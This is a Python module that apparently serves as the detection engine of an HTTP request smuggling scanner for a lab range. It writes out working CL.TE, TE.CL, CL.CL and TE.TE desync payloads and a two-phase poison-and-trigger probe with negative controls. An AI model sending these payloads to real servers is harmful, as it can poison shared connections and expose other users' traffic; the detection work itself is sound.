"""The detection engine.

A vulnerability is *confirmed* only when a request the attacker hid inside an
ambiguous message is executed by the origin **on a different client
connection** than the one the attacker used.  That is not a timing guess: the
attacker's connection is closed before the victim ever connects, so the only
way the hidden request can appear is that it was left pending on a shared
upstream connection -- the definition of a desync, and the mechanism behind
response-queue poisoning.

Detection uses a two-phase probe per *wire shape*:

1. **Poison** -- open a connection, send the ambiguous request whose hidden
   request declares a body it never sends, then close the connection.  Leaving
   the back end mid-body is what keeps the desynced bytes pending.
2. **Trigger** -- open *fresh* connections and send a benign, uniquely tagged
   request.  The bytes that complete the hidden request can only come from
   here.  If a victim connection's responses contain the attacker's nonce, the
   hidden request was executed for that victim.

False positives are controlled four ways:

* the attacker connection is *closed* before any victim connects, so
  "pipelined on my own socket" cannot explain a leak;
* every nonce is random per trial, so no marker can be guessed or cached;
* a negative-control pass sends the same poison built from a *non-ambiguous*
  request and must stay clean -- if the control leaks, the range is noisy and
  the result is discarded rather than reported;
* a verdict requires the leak to reproduce, and confidence is the observed
  reproduction rate.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field

from .probe import Response, new_nonce, run_probe

__all__ = [
    "WireShape",
    "WIRE_SHAPES",
    "TrialResult",
    "ShapeResult",
    "Finding",
    "Target",
    "run_campaign",
    "probe_shape",
]


@dataclass
class Target:
    host: str
    port: int
    label: str = ""
    connect_timeout: float = 3.0
    read_timeout: float = 0.4


# ---------------------------------------------------------------------------
# payloads
# ---------------------------------------------------------------------------


def _bait(tag: str, total: int) -> bytes:
    """A benign trigger request padded to roughly ``total`` bytes."""
    head = f"POST /__lab/echo/{tag} HTTP/1.1\r\nHost: trigger\r\nContent-Length: {{n}}\r\n\r\n"
    placeholder = head.format(n=0)
    pad = max(0, total - len(placeholder))
    return head.format(n=pad).encode("latin-1") + b"V" * pad


def _hidden(nonce: str, declared_body: int) -> bytes:
    """The request hidden in the ambiguity; it *waits* for ``declared_body``."""
    return (
        f"GET /__lab/echo/{nonce} HTTP/1.1\r\n"
        f"Host: smuggled\r\n"
        f"Content-Length: {declared_body}\r\n\r\n"
    ).encode("latin-1")


@dataclass(frozen=True)
class WireShape:
    key: str
    family: str
    title: str
    explanation: str
    poison: "callable"
    control: "callable"


def _poison_cl_te(nonce: str, victim_len: int) -> bytes:
    # Front end (Content-Length) reads the whole thing as body; back end
    # (chunked) sees "0\r\n\r\n" terminate the body and starts parsing the
    # hidden request, which then blocks for victim_len more bytes.
    hid = _hidden(nonce, victim_len)
    body = b"0\r\n\r\n" + hid
    return (
        f"POST /__lab/noop HTTP/1.1\r\nHost: attacker\r\n"
        f"Content-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\n\r\n"
    ).encode("latin-1") + body


def _poison_te_cl(nonce: str, victim_len: int) -> bytes:
    # Front end (chunked) decodes; back end (Content-Length) stops after the
    # short chunk-size line and parses the hidden request, which blocks.
    hid = _hidden(nonce, victim_len)
    size = b"%x" % len(hid) + b"\r\n"
    body = size + hid + b"\r\n0\r\n\r\n"
    return (
        f"POST /__lab/noop HTTP/1.1\r\nHost: attacker\r\n"
        f"Content-Length: {len(size)}\r\nTransfer-Encoding: chunked\r\n\r\n"
    ).encode("latin-1") + body


def _poison_cl_cl(nonce: str, victim_len: int) -> bytes:
    # Front end takes the first Content-Length, back end the second; the gap
    # leaves a request's worth of bytes that blocks for the declared body.
    hid = _hidden(nonce, victim_len)
    pad = b"Q" * 8
    blob = pad + hid
    return (
        f"POST /__lab/noop HTTP/1.1\r\nHost: attacker\r\n"
        f"Content-Length: {len(blob)}\r\nContent-Length: {len(pad)}\r\n\r\n"
    ).encode("latin-1") + blob


def _poison_te_te(nonce: str, victim_len: int) -> bytes:
    # Two Transfer-Encoding headers.  A hop that falls back to Content-Length
    # reads the whole blob as body; a hop that reads the first TE header (or
    # finds "chunked") decodes it and is left with the hidden request.
    hid = _hidden(nonce, victim_len)
    body = b"0\r\n\r\n" + hid
    return (
        f"POST /__lab/noop HTTP/1.1\r\nHost: attacker\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n"
    ).encode("latin-1") + body


def _control(key: str, nonce: str, victim_len: int):
    """A non-ambiguous request carrying the same nonce, framed as plain body."""
    hid = _hidden(nonce, victim_len)
    if key in ("cl_te", "te_cl", "te_te"):
        # Correct chunked framing: the whole hidden request is one chunk.
        body = b"%x" % len(hid) + b"\r\n" + hid + b"\r\n0\r\n\r\n"
        return (
            f"POST /__lab/noop HTTP/1.1\r\nHost: attacker\r\n"
            f"Content-Length: {len(body)}\r\n\r\n"
        ).encode("latin-1") + body
    # cl_cl control: a single, unambiguous Content-Length.
    body = hid
    return (
        f"POST /__lab/noop HTTP/1.1\r\nHost: attacker\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode("latin-1") + body


WIRE_SHAPES: list[WireShape] = [
    WireShape(
        "cl_te",
        "CL.TE",
        "Front trusts Content-Length, origin trusts Transfer-Encoding",
        "The front end reads the whole blob as a Content-Length body; the origin "
        "decodes it as chunked, ends the body at the zero chunk, and treats the "
        "remaining bytes as the start of the next request.",
        _poison_cl_te,
        lambda n, v: _control("cl_te", n, v),
    ),
    WireShape(
        "te_cl",
        "TE.CL",
        "Front trusts Transfer-Encoding, origin trusts Content-Length",
        "The front end decodes the chunked body; the origin obeys the shorter "
        "Content-Length, stops inside the chunk framing, and parses the rest as "
        "a new request.",
        _poison_te_cl,
        lambda n, v: _control("te_cl", n, v),
    ),
    WireShape(
        "cl_cl",
        "CL.CL",
        "Both honour Content-Length but disagree on which one",
        "The first Content-Length is large and the second small (or vice versa). "
        "A first-wins hop and a last-wins hop disagree by the difference, leaving "
        "a request's worth of bytes in the stream.",
        _poison_cl_cl,
        lambda n, v: _control("cl_cl", n, v),
    ),
    WireShape(
        "te_te",
        "TE.TE",
        "Two Transfer-Encoding headers, one unusable",
        "A hop that cannot use the Transfer-Encoding list falls back to "
        "Content-Length; a hop that reads the first TE header decodes it. The "
        "two disagree on where the body ends.",
        _poison_te_te,
        lambda n, v: _control("te_te", n, v),
    ),
]

WIRE_SHAPES_BY_KEY = {s.key: s for s in WIRE_SHAPES}


# ---------------------------------------------------------------------------
# results
# ---------------------------------------------------------------------------


@dataclass
class TrialResult:
    trial: int
    kind: str                  # "poison" | "control"
    poison_sent: bytes
    trigger_sent: bytes
    trigger_responses: list[Response]
    leaked_nonce: bool
    responded_tag: bool

    def as_dict(self) -> dict:
        return {
            "trial": self.trial,
            "kind": self.kind,
            "poison_sent": self.poison_sent.decode("latin-1"),
            "trigger_sent": self.trigger_sent.decode("latin-1"),
            "trigger_responses": [r.as_dict() for r in self.trigger_responses],
            "leaked_nonce": self.leaked_nonce,
            "responded_tag": self.responded_tag,
        }


@dataclass
class ShapeResult:
    key: str
    family: str
    title: str
    explanation: str
    vulnerable: bool
    confidence: float
    trials: list[TrialResult]
    control: TrialResult | None
    note: str = ""

    @property
    def reproductions(self) -> int:
        return sum(1 for t in self.trials if t.leaked_nonce)

    def as_dict(self) -> dict:
        return {
            "key": self.key,
            "family": self.family,
            "title": self.title,
            "explanation": self.explanation,
            "vulnerable": self.vulnerable,
            "confidence": round(self.confidence, 3),
            "note": self.note,
            "reproductions": self.reproductions,
            "attempts": len(self.trials),
            "trials": [t.as_dict() for t in self.trials],
            "control": self.control.as_dict() if self.control else None,
        }


@dataclass
class Finding:
    target: Target
    results: list[ShapeResult]
    started: float
    finished: float
    meta: dict = field(default_factory=dict)

    @property
    def vulnerable_results(self) -> list[ShapeResult]:
        return [r for r in self.results if r.vulnerable]

    def as_dict(self) -> dict:
        return {
            "target": {"host": self.target.host, "port": self.target.port, "label": self.target.label},
            "meta": self.meta,
            "started": self.started,
            "finished": self.finished,
            "duration": round(self.finished - self.started, 3),
            "vulnerable_count": len(self.vulnerable_results),
            "tested_count": len(self.results),
            "results": [r.as_dict() for r in self.results],
        }


# ---------------------------------------------------------------------------
# one shape
# ---------------------------------------------------------------------------


def _poison_and_trigger(target: Target, poison: bytes, kind: str, trial: int,
                        victim_len: int, victim_nonce: str,
                        poison_wait: float = 0.12) -> TrialResult:
    # Phase 1: attacker connection, sent and closed.
    run_probe(target.host, target.port, [poison],
              read_timeout=min(poison_wait, target.read_timeout),
              connect_timeout=target.connect_timeout, idle_gap=0.03)
    time.sleep(0.02)
    # Phase 2: fresh victim connection.  Its bytes complete the hidden request.
    tag = new_nonce("v")
    bait = _bait(tag, victim_len)
    run = run_probe(target.host, target.port, [bait], read_timeout=target.read_timeout,
                    connect_timeout=target.connect_timeout, idle_gap=0.08)
    nonces = [n for resp in run.responses for n in resp.nonces()]
    return TrialResult(
        trial=trial,
        kind=kind,
        poison_sent=poison,
        trigger_sent=bait,
        trigger_responses=run.responses,
        leaked_nonce=victim_nonce in nonces,
        responded_tag=tag in nonces or any(resp.status < 500 for resp in run.responses),
    )


def probe_shape(target: Target, shape: WireShape, *, trials: int = 3,
                victim_len: int = 96) -> ShapeResult:
    leaked = 0
    trial_results: list[TrialResult] = []
    for i in range(trials):
        nonce = new_nonce("h")
        tr = _poison_and_trigger(
            target, shape.poison(nonce, victim_len), "poison", i, victim_len, nonce
        )
        trial_results.append(tr)
        if tr.leaked_nonce:
            leaked += 1
        time.sleep(0.02)

    cnonce = new_nonce("c")
    control = _poison_and_trigger(
        target, shape.control(cnonce, victim_len), "control", -1, victim_len, cnonce
    )

    control_noisy = control.leaked_nonce
    vulnerable = leaked > 0 and not control_noisy
    confidence = leaked / trials if trials else 0.0
    if control_noisy:
        confidence *= 0.25

    note = ""
    if control_noisy:
        note = ("negative control leaked: the range produced a spurious signal, "
                "result discarded")
    elif leaked and leaked < trials:
        note = f"leaked in {leaked}/{trials} trials; flaky but reproducible"
    elif leaked == 0:
        note = "no cross-connection leak observed"

    return ShapeResult(
        key=shape.key,
        family=shape.family,
        title=shape.title,
        explanation=shape.explanation,
        vulnerable=vulnerable,
        confidence=confidence,
        trials=trial_results,
        control=control,
        note=note,
    )


def run_campaign(target: Target, *, keys: list[str] | None = None, trials: int = 3,
                 victim_len: int = 96) -> Finding:
    shapes = WIRE_SHAPES
    if keys:
        shapes = [WIRE_SHAPES_BY_KEY[k] for k in keys if k in WIRE_SHAPES_BY_KEY]
    started = time.time()
    results = [probe_shape(target, s, trials=trials, victim_len=victim_len) for s in shapes]
    finished = time.time()
    return Finding(
        target=target,
        results=results,
        started=started,
        finished=finished,
        meta={"trials": trials, "victim_len": victim_len},
    )
